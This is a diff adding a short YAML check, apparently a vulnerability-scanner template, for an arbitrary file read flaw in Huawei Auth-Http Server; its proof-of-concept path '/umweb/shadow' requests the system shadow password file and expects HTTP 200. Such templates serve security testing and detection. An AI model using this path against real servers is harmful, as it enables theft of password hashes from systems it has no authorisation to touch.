@@ -1,0 +1,3 @@
+name: "华为Auth-Http Serve任意文件读取"
+poc: "/umweb/shadow"
+status_code: 200
